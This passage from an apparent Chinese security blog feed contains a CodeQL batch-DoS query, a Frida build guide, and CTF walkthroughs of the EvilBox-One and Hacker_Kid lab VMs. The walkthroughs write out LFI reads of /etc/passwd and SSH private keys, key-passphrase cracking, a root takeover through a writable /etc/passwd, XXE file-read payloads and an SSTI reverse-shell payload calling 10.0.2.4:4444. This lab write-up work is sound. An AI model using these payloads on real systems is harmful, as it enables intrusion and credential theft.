an.getType().hasName(&quot;Size&quot;)</span><br><span class="line">            and this=an.getTarget()</span><br><span class="line">        )</span><br><span class="line">        or not exists(</span><br><span class="line">            Annotation an|this=an.getTarget()</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> // 实际获取的入参，用上面的条件限制</span><br><span class="line"> class ListParameter extends Parameter&#123;</span><br><span class="line">    ListParameter()&#123;</span><br><span class="line">        this.getType() instanceof CollectionType</span><br><span class="line">        and this instanceof NoAnnOrnotAn</span><br><span class="line">        and this instanceof NoSetClass</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> class Batch_Dos extends TaintTracking::Configuration&#123;</span><br><span class="line">    Batch_Dos()&#123;</span><br><span class="line">        this = &quot;FuckDos&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    // source类型声明</span><br><span class="line">    override predicate isSource(DataFlow::Node source)&#123;</span><br><span class="line">        source.asParameter() instanceof ListParameter</span><br><span class="line">    &#125;</span><br><span class="line">	// sink定义为dao操作，涉及集合类型</span><br><span class="line">    override predicate isSink(DataFlow::Node sink)&#123;</span><br><span class="line">        exists(MethodAccess m,Expr e | sink.asExpr()=e</span><br><span class="line">            and m.getAnArgument().getType() instanceof CollectionType</span><br><span class="line">            and m.getAChildExpr().toString().indexOf(&quot;Dao&quot;) = m.getAChildExpr().toString().length() - 3</span><br><span class="line">            and e = m.getAnArgument()</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Batch_Dos batch, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where batch.hasFlowPath(source,sink)</span><br><span class="line">select source.getNode(),source,sink,&quot;source&quot;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>安全开发</tag>
      </tags>
  </entry>
  <entry>
    <title>EvilBox_One</title>
    <url>/2022/11/23/EvilBox-One/</url>
    <content><![CDATA[<p><strong>0x01 主机发现</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br></pre></td></tr></table></figure>

<img src="/2022/11/23/EvilBox-One/01.png" class title="This is an example image">



<p><strong>0x02 端口扫描</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.9</span><br></pre></td></tr></table></figure>

<img src="/2022/11/23/EvilBox-One/02.png" class title="This is an example image">



<p><strong>0x03 服务发现</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80 -A 10.0.2.9</span><br></pre></td></tr></table></figure>

<img src="/2022/11/23/EvilBox-One/03.png" class title="This is an example image">



<p><strong>0x04 多重路径爆破</strong></p>
<p>看到只开放了 22 端口和 80 端口，初步尝试 <strong>SSH 爆破无果</strong>，访问页面试试</p>
<img src="/2022/11/23/EvilBox-One/04.png" class title="This is an example image">



<p>只有一个 Apache 初始页面，对于这样的页面思路就是<strong>路径爆破</strong>了。先试着访问默认的 robots.txt 是否存在。</p>
<img src="/2022/11/23/EvilBox-One/05.png" class title="This is an example image">



<p>接着使用 gobuster 进行路径爆破（其他工具皆可，此工具为 GO 语言编写，速度较快）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://10.0.2.9 -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,hyml,jsp</span><br></pre></td></tr></table></figure>

<img src="/2022/11/23/EvilBox-One/06.png" class title="This is an example image">



<p>只发现了一个二级目录 &#x2F;secret，此<strong>页面访问为空</strong>，<strong>右键查看源代码也为空</strong>，那对二级目录继续尝试爆破</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://10.0.2.9/secret -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,hyml,jsp</span><br></pre></td></tr></table></figure>

<img src="/2022/11/23/EvilBox-One/07.png" class title="This is an example image">



<p><strong>0x05 文件参数爆破&amp;文件包含漏洞</strong></p>
<p>发现 &#x2F;secret 目录下存在一个 evil.php 文件，这里<strong>访问页面还是为空，右键查看源代码也为空</strong>。那就继续尝试对此php的<strong>执行参数进行爆破</strong>（这个可能比较少见，但试试）。先新建参数值字典：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi val.txt #将(1 2 3 a b c &#x27; &quot; ( &lt; , ; ? / %)作为字典值，换行写入</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:PARAN -w val.txt:VAL -u http://10.0.2.9/secret/evil.php?PARAN=VAL -fs 0</span><br></pre></td></tr></table></figure>

<img src="/2022/11/23/EvilBox-One/08.png" class title="This is an example image">



<p>第一次尝试没爆破出结果，那尝试参数包含文件，即<strong>尝试包含服务器本地存在的文件</strong>，即 index.html</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://10.0.2.9/secret/evil.php?FUZZ=../index.html -fs 0</span><br></pre></td></tr></table></figure>

<img src="/2022/11/23/EvilBox-One/09.png" class title="This is an example image">



<p>可以看到存在 command 参数，疑似存在包含漏洞，访问以下链接效果相同，说明确实存在文件包含漏洞</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://10.0.2.9/secret/evil.php?command=../index.html </span><br><span class="line">http://10.0.2.9</span><br></pre></td></tr></table></figure>

<img src="/2022/11/23/EvilBox-One/10.png" class title="This is an example image">



<p>那尝试远程文件包含，即在本机新建 shell.php，让目标在远程加载</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://10.0.2.9/secret/evil.php?command=http://10.0.2.4/shell.php</span><br></pre></td></tr></table></figure>



<p>无果，推测此文件包含漏洞属于本地文件包含，并不能远程包含文件。</p>
<p>那现在的思路是使用 php 语言支持的封装器，就是各种请求协议，比如 data、php、file、zip等。先用 php 协议尝试读取当前漏洞文件源码，此处需把源码转换成 Base64 读取，不然 php 源码会直接被解析</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://10.0.2.9/secret/evil.php?command=php://filter/convert.base64-encode/resource=evil.php</span><br></pre></td></tr></table></figure>

<img src="/2022/11/23/EvilBox-One/11.png" class title="This is an example image">



<p>解码获得 evil.php 源码，确实存在文件包含漏洞</p>
<img src="/2022/11/23/EvilBox-One/12.png" class title="This is an example image">



<p>这里想着能否用 php 协议写入文件，尝试访问，直接404，应该是没有写入权限。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://10.0.2.9/secret/evil.php?command=php://filter/write=convert.base64-decode/resource=test.php&amp;txt=MTIz</span><br></pre></td></tr></table></figure>



<p><strong>0x05 本地文件读取&amp;SSH密钥破解</strong></p>
<p>继续尝试，想起这个文件包含漏洞是针对本地的，那么可以用于文件读取，尝试读取 <strong>&#x2F;etc&#x2F;passwd</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://10.0.2.9/secret/evil.php?command=../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>

<img src="/2022/11/23/EvilBox-One/13.png" class title="This is an example image">



<p>成功读取并看到有一个非系统账户 mowree 有 bash 权限。想起目标开放了 SSH 登录服务，并且支持密钥登录。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh mowree@10.0.2.9 -v  # -v 参数打印登录详细信息</span><br></pre></td></tr></table></figure>

<img src="/2022/11/23/EvilBox-One/14.png" class title="This is an example image">



<p>补充一下：密钥登录是，客户生成 SSH 公私钥，把公钥放在服务器上，私钥放在本机，两者用于登录验证，但默认配置，公私钥是在服务器上的。</p>
<p>那现在的思路就变为，是否能够利用文件包含漏洞，读取公钥、私钥信息，用于直接登录。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://10.0.2.9/secret/evil.php?command=../../../../home/mowree/.ssh/id_rsa#私钥，本地用于登录认证</span><br></pre></td></tr></table></figure>

<img src="/2022/11/23/EvilBox-One/15.png" class title="This is an example image">



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">http://10.0.2.9/secret/evil.php?command=../../../../home/mowree/.ssh/authorized_keys#公钥，放在服务器上</span><br></pre></td></tr></table></figure>

<img src="/2022/11/23/EvilBox-One/16.png" class title="This is an example image">



<p>把私钥复制到本地，新建 id_rsa 文件，赋予600权限，太大太小都不行，尝试登录：</p>
<img src="/2022/11/23/EvilBox-One/17.png" class title="This is an example image">



<p>好吧~，人家对私钥进行了加密，还需要另外的密码才能使用这个！</p>
<p>但这里确实是个突破点，就只能继续尝试爆破了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">复制本机破解字典</span></span><br><span class="line">cp /usr/share/wordlists/rockyou.txt.gz .</span><br><span class="line">gunzip rockyou.txt.gz</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">转换密钥格式，便于工具破解</span></span><br><span class="line">/usr/share/john/ssh2john.py /home/kali/Desktop/tool/id_rsa &gt; /home/kali/Desktop/tool/hash </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">破解私钥加密密码</span></span><br><span class="line">john hash --worlist=rockyou.txt</span><br></pre></td></tr></table></figure>

<img src="/2022/11/23/EvilBox-One/18.png" class title="This is an example image">



<p>成功登录~</p>
<img src="/2022/11/23/EvilBox-One/19.png" class title="This is an example image">



<p><strong>0x06 提权到 root</strong></p>
<p>常见提权手段来一波</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -l # 无 sudo 权限配置不当</span><br><span class="line">uname -a # 无可利用内核提权漏洞</span><br></pre></td></tr></table></figure>

<img src="/2022/11/23/EvilBox-One/20.png" class title="This is an example image">



<p>那就找找有没有 suid 或 sgid 配置不当的文件，发现只有默认的系统文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm /4000 2&gt;/dev/null #搜索权限配置不当，屏蔽错误信息 suid-4000 sgid-2000</span><br></pre></td></tr></table></figure>

<img src="/2022/11/23/EvilBox-One/21.png" class title="This is an example image">



<p>那就再找找有没有配置不当的可读写文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -writable 2&gt;/dev/null | grep -v proc | grep -v sys | grep -v tmp #过滤部分文件前缀</span><br></pre></td></tr></table></figure>

<img src="/2022/11/23/EvilBox-One/22.png" class title="This is an example image">



<p>可看到当前用户对 &#x2F;etc&#x2F;passwd 居然有读写权限。&#x2F;etc&#x2F;passwd文件只存在账号列表及对应的权限，对应的密码文件存储在 &#x2F;etc&#x2F;shadow 文件，只有 root 能读写。但如果能直接修改 &#x2F;etc&#x2F;passwd文件，就可以直接覆盖 root 密码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 #生成加密密码</span><br></pre></td></tr></table></figure>

<img src="/2022/11/23/EvilBox-One/23.png" class title="This is an example image">



<p>成功登录</p>
<img src="/2022/11/23/EvilBox-One/24.png" class title="This is an example image">]]></content>
      <categories>
        <category>红队</category>
      </categories>
      <tags>
        <tag>打靶</tag>
      </tags>
  </entry>
  <entry>
    <title>Frida源码编译历史版本</title>
    <url>/2025/08/24/Frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC/</url>
    <content><![CDATA[<p>之前为了体验一把魔改Frida过检测，自己手动测试了，都是坑只能说。</p>
<p>编译环境：Ubuntu 22.04.5 LTS</p>
<p>下载连接：<a href="https://www.releases.ubuntu.com/22.04/">https://www.releases.ubuntu.com/22.04/</a></p>
<p>PS：基于全新Ubuntu 环境、需要外网。编译Frida或Magisk建议用干净的环境。</p>
<h1 id="安装Proxychains"><a href="#安装Proxychains" class="headerlink" title="安装Proxychains"></a>安装Proxychains</h1><p>代理软件用的是 hiddify，用其他V2等都可以</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install libfuse2</span><br></pre></td></tr></table></figure>

 <img src="/2025/08/24/Frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC/01.png" class title="This is an example image">

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install proxychains</span><br><span class="line">sudo gedit /etc/proxychains.conf</span><br></pre></td></tr></table></figure>

 <img src="/2025/08/24/Frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC/02.png" class title="This is an example image">

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install curl</span><br><span class="line">// 验证代理IP</span><br><span class="line">proxychains curl www.httpbin.org/ip  </span><br></pre></td></tr></table></figure>

<h1 id="修改桌面为Desktop"><a href="#修改桌面为Desktop" class="headerlink" title="修改桌面为Desktop"></a>修改桌面为Desktop</h1><p>PS：需要修改默认的桌面为Desktop，不然配置环境变量有问题</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gedit ~/.config/user-dirs.dirs</span><br><span class="line">修改 XDG_DESKTOP_DIR=<span class="string">&quot;<span class="variable">$HOME</span>/桌面&quot;</span> 为 XDG_DESKTOP_DIR=<span class="string">&quot;<span class="variable">$HOME</span>/Desktop&quot;</span></span><br><span class="line"><span class="built_in">mv</span> ~/桌面 ~/Desktop</span><br><span class="line">xdg-user-dirs-update</span><br><span class="line">重启</span><br></pre></td></tr></table></figure>

<p>如果是拉源码后再改桌面名，需要重新拉一次源码</p>
<h1 id="安装依赖-amp-拉取源码"><a href="#安装依赖-amp-拉取源码" class="headerlink" title="安装依赖&amp;拉取源码"></a>安装依赖&amp;拉取源码</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install git</span><br></pre></td></tr></table></figure>

<h2 id="安装vscode"><a href="#安装vscode" class="headerlink" title="安装vscode"></a>安装vscode</h2><p>下载deb包</p>
<p><a href="https://code.visualstudio.com/Download">https://code.visualstudio.com/Download</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo dpkg -i vscode.deb</span><br><span class="line">// 打开vscode</span><br><span class="line">code .</span><br></pre></td></tr></table></figure>

<h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains sudo apt-get install build-essential curl git lib32stdc++-9-dev libc6-dev-i386</span><br></pre></td></tr></table></figure>

<h2 id="拉取源码"><a href="#拉取源码" class="headerlink" title="拉取源码"></a>拉取源码</h2><p>我这里编译的Frida的历史版本16.2.1，默认拉取的最新的版本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains git <span class="built_in">clone</span> -b 16.2.1 --recurse-submodules https://github.com/frida/frida</span><br></pre></td></tr></table></figure>

<h2 id="编译前置（踩坑）"><a href="#编译前置（踩坑）" class="headerlink" title="编译前置（踩坑）"></a>编译前置（踩坑）</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install m4</span><br></pre></td></tr></table></figure>

<p>先直接编译，这一步是为了生成build文件夹，后续手动下载后好替换</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains make -f Makefile.toolchain.mk</span><br></pre></td></tr></table></figure>

<h3 id="SDK下载"><a href="#SDK下载" class="headerlink" title="SDK下载"></a>SDK下载</h3><p>查看当前Frida对应的SDK版本目录下 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> releng</span><br><span class="line"><span class="built_in">cat</span> deps.mk | <span class="built_in">head</span> -n 10 <span class="comment">#查看deps.mk的前10行，版本是 20240123</span></span><br></pre></td></tr></table></figure>

<img src="/2025/08/24/Frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC/04.png" class title="This is an example image">

<p>下载sdk，下载到 frida目录&#x2F;build，建议把下载的先备份，防止操作失误，其他版本记得替换版本号</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo wget https://build.frida.re/deps/20240123/toolchain-linux-x86_64.tar.bz2</span><br><span class="line">sudo wget https://build.frida.re/deps/20240123/sdk-linux-x86_64.tar.bz2</span><br><span class="line">sudo wget https://build.frida.re/deps/20240123/sdk-android-arm64.tar.bz2</span><br></pre></td></tr></table></figure>

<p>刷新 env</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># /frida目录下执行</span></span><br><span class="line">./releng/setup-env.sh</span><br></pre></td></tr></table></figure>

<h3 id="NDK下载"><a href="#NDK下载" class="headerlink" title="NDK下载"></a>NDK下载</h3><p>手动下载需要的ndk版本，查看frida对应的版本，可随意下载目录，环境变量指定路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> releng</span><br><span class="line"><span class="built_in">cat</span> setup-env.sh | grep ndk</span><br></pre></td></tr></table></figure>

<img src="/2025/08/24/Frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC/05.png" class title="This is an example image">

<p>下载ndk官网地址：<a href="https://developer.android.com/ndk/downloads?hl=zh-cn%EF%BC%8C%E5%85%B7%E4%BD%93%E5%90%8D%E5%AD%97%E7%9C%8B%E5%AE%98%E7%BD%91">https://developer.android.com/ndk/downloads?hl=zh-cn，具体名字看官网</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains wget https://dl.google.com/android/repository/android-ndk-r25c-linux-x86_64.zip</span><br><span class="line">unzip xxx</span><br></pre></td></tr></table></figure>

<img src="/2025/08/24/Frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC/06.png" class title="This is an example image">

<p>配置ndk路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo gedit ~/.bashrc</span><br><span class="line"><span class="built_in">export</span> ANDROID_NDK_ROOT=/XXX/XXX/android-ndk-r25c</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$ANDROID_NDK_ROOT</span>:<span class="variable">$PATH</span></span><br><span class="line">ndk-build -v</span><br></pre></td></tr></table></figure>

<h3 id="Nodejs和Npm下载"><a href="#Nodejs和Npm下载" class="headerlink" title="Nodejs和Npm下载"></a>Nodejs和Npm下载</h3><p>虽然Froda的作者推荐新版本的nodejs和npm，但每一个版本的frida release都会有固定版本的nodejs，如果想要不出错，还是建议使用release版本中的node版本。</p>
 <img src="/2025/08/24/Frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC/03.png" class title="This is an example image">

<p><a href="https://nodejs.org/zh-cn/about/previous-releases">https://nodejs.org/zh-cn/about/previous-releases</a></p>
 <img src="/2025/08/24/Frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC/07.png" class title="This is an example image">

<p>本次编译，采用的是108对应的v18.12.0。大概是18版本都可以</p>
<p>nodejs历史版本下载： <a href="https://nodejs.org/download/release/">Index of &#x2F;download&#x2F;release&#x2F;</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo gedit ~/.bashrc</span><br><span class="line"><span class="comment"># set node</span></span><br><span class="line"><span class="built_in">export</span> NODE_HOME=/home/ubuntu/work/node-v18.12.0-linux-x64</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$&#123;NODE_HOME&#125;</span>/bin</span><br></pre></td></tr></table></figure>

 <img src="/2025/08/24/Frida%E6%BA%90%E7%A0%81%E7%BC%96%E8%AF%91%E5%8E%86%E5%8F%B2%E7%89%88%E6%9C%AC/08.png" class title="This is an example image">

<p>通过哪种方式装Nodejs都行</p>
<h1 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#编译</span></span><br><span class="line">make core-android-arm64</span><br><span class="line"><span class="comment">#生成路径如下</span></span><br><span class="line">frida/build/tmp-android-arm64/frida-core/server</span><br></pre></td></tr></table></figure>

<p>注意注意：执行make clean时候会把自建的其他文件删除，例如python</p>
<h1 id="魔改Frida参考"><a href="#魔改Frida参考" class="headerlink" title="魔改Frida参考"></a>魔改Frida参考</h1><p><a href="https://github.com/hluwa/Patchs/tree/master/strongR-frida/frida-core">https://github.com/hluwa/Patchs/tree/master/strongR-frida/frida-core</a></p>
]]></content>
      <categories>
        <category>红队</category>
      </categories>
      <tags>
        <tag>Frida</tag>
      </tags>
  </entry>
  <entry>
    <title>Hacker_Kid</title>
    <url>/2022/12/01/Hacker-Kid/</url>
    <content><![CDATA[<p><strong>0x01 主机发现</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br></pre></td></tr></table></figure>

<img src="/2022/12/01/Hacker-Kid/01.png" class title="This is an example image">



<p><strong>0x02 端口扫描</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.10</span><br></pre></td></tr></table></figure>

<img src="/2022/12/01/Hacker-Kid/02.png" class title="This is an example image">



<p><strong>0x03 服务识别</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p53,80,9999 -sV 10.0.2.10</span><br></pre></td></tr></table></figure>

<img src="/2022/12/01/Hacker-Kid/03.png" class title="This is an example image">

<p>可以看到53端口开放的服务是 domain，版本是BIND 9，这是一款DNS服务器，就是用来把域名解析到IP的。默认是开启53端口的TCP(用于同步记录)和UDP(用于解析域名)的，探测下UDP是否开启。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p53 -sU 10.0.2.10</span><br></pre></td></tr></table></figure>

<img src="/2022/12/01/Hacker-Kid/04.png" class title="This is an example image">



<p><strong>0x04 Web页面探测</strong></p>
<p>访问开放的web服务</p>
<img src="/2022/12/01/Hacker-Kid/05.png" class title="This is an example image">



<p>各个标签点击后并无响应请求，右键查看源代码看到有注释的信息。</p>
<img src="/2022/12/01/Hacker-Kid/06.png" class title="This is an example image">



<p>提示我们用 GET 请求参数 page_no 去访问页面，但参数值范围不清楚，拿bp爆破下试试。</p>
<img src="/2022/12/01/Hacker-Kid/07.png" class title="This is an example image">



<p>可以看到 page_no 为21时响应不同，访问试试</p>
<img src="/2022/12/01/Hacker-Kid/08.png" class title="This is an example image">



<p>页面下面多了一行红色小字，提示有子域名存在后门漏洞，例如 hackers.blackhat.local 。那就先添加下本地域名解析。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/hosts</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">添加内容如下</span></span><br><span class="line">10.0.2.10 blackhat.local</span><br><span class="line">10.0.2.10 hackers.blackhat.local</span><br></pre></td></tr></table></figure>



<p><strong>0x05 DNS区域传输</strong></p>
<p>访问 hackers.blackhat.local 试试</p>
<img src="/2022/12/01/Hacker-Kid/09.png" class title="This is an example image">



<p>提示信息一直说 DIG me more。补充下，DIG工具是Linux上用于查询DNS解析记录的，而刚才服务识别也发现了 53 端口开放着 DNS 服务器，那就来 DIG 一下吧。</p>
<img src="/2022/12/01/Hacker-Kid/10.png" class title="This is an example image">



<p>可以看到查询到了更多的域名解析记录，把相关子域名都加入hosts文件解析。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/hosts</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">添加内容如下</span></span><br><span class="line">10.0.2.10       hackers.blackhat.local</span><br><span class="line">10.0.2.10       blackhat.local</span><br><span class="line">10.0.2.10       hackerkid.blackhat.local</span><br><span class="line">10.0.2.10       ns1.blackhat.local</span><br><span class="line">10.0.2.10       mail.blackhat.local</span><br><span class="line">10.0.2.10       hacker.blackhat.local.blackhat.local</span><br></pre></td></tr></table></figure>



<p>前面扫描端口时开放了 80 和 9999 端口，那就对新增的这几个子域名逐个访问，发现了一个登录页，一个注册页，但显然不是同一个功能。</p>
<img src="/2022/12/01/Hacker-Kid/11.png" class title="This is an example image">

<img src="/2022/12/01/Hacker-Kid/12.png" class title="This is an example image">



<p><strong>0x06 XXE注入攻击 &amp; PHP封装器</strong></p>
<p>现在我们啥没有，直接注册试试。发现响应信息有这么个特点，无论输入什么，都提示<strong>邮箱不合法</strong>，并把<strong>邮箱信息打印</strong>出来。而且数据传输格式是 xml。这就想起了 XXE 漏洞，猜测后台就是解析用户 xml 信息并打印邮箱信息。</p>
<img src="/2022/12/01/Hacker-Kid/13.png" class title="This is an example image">



<p>XXE 测试，注入点是邮箱信息</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [<span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;file:///etc/passwd&#x27;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">email</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2022/12/01/Hacker-Kid/14.png" class title="This is an example image">



<p>可以看到有个 saket 用户有 bash权限，那就尝试用 XXE 读取 saket 相关的文件。尝试读取默认的<strong>SSH公私钥文件</strong>（.ssh&#x2F;authorized_keys），无果。多番尝试后读取了目录下的 .bashrc 文件，读取过程中需要 <strong>base64 编码</strong>将文件信息带出，可能是系统默认识别为执行代码，编码带出则为文本。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [<span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;php://filter/convert.base64-encode/resource=/home/saket/.bashrc&#x27;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">email</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2022/12/01/Hacker-Kid/15.png" class title="This is an example image">



<p><strong>0x07 SSTI模板注入</strong></p>
<p>解码后的文件中有个账号密码，还记得我们之前有个登录页面吗，尝试登录，失败！！！</p>
<img src="/2022/12/01/Hacker-Kid/16.png" class title="This is an example image">



<p>观察了一下，这密码是 <strong>Saket!#$%@!!</strong> ，那对应的账号会不会是 saket 而不是 admin，成功登录！！！</p>
<img src="/2022/12/01/Hacker-Kid/17.png" class title="This is an example image">



<p>看到登录后的页面通过获取 GET 传入的 name 参数，直接显示在页面上，会不会存在 <strong>SSTI 模板注入</strong>漏洞。现在各种开发语言如：JAVA(velocity 模板等)、PHP(Smarty 模板等)、Python(Tornado 模板等)，都存在后端进行前端模板渲染，这期间如果没做过滤，就可能存在对应模板的任意表达式执行。</p>
<p>根据前面 nmap 服务识别可知，服务端用的是 <strong>Tornado</strong> 模板，先尝试用通用渲染方式探测是否存在漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;1+abcxyz&#125;&#125;$&#123;1+abcxyz&#125;%3C%1+abcxyz%%3E[abcxyz]</span><br></pre></td></tr></table></figure>



<p>看到报错，说明确实解析到了，存在漏洞</p>
<img src="/2022/12/01/Hacker-Kid/18.png" class title="This is an example image">



<p>测试解析占位符格式，哪种形式的参数被解析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;7*7&#125;,&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>

<img src="/2022/12/01/Hacker-Kid/19.png" class title="This is an example image">



<p>可以看到第二种解析形式被成功解析，则注入表达式要在两重括号内。表达式的敏感字符默认会被过滤，需要对 **{ %**，做URL编码，详细编码如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;% import os %&#125;&#123;&#123;os.system(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.0.2.4/4444 0&gt;&amp;1&quot;&#x27;)&#125;&#125;  #表达式内容作编码</span><br></pre></td></tr></table></figure>

<p>把需要被表达式解析的{}、()、%、空格、’’、””全部做 url 编码，相关参数的 . 符号就不用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%7b%25%20import%20os%20%25%7d%7b%7bos.system%28%27bash%20-c%20%22bash%20-i%20%3e%26 %2fdev%2ftcp%2f10.0.2.4%2f4444%200%3e%261%22%27%29%7d%7d</span><br></pre></td></tr></table></figure>



<p>拿到了 saket 账户的 shell，还需要一波提权。</p>
<img src="/2022/12/01/Hacker-Kid/20.png" class title="This is an example image">



<p><strong>0x08 Capabilitie提权</strong></p>
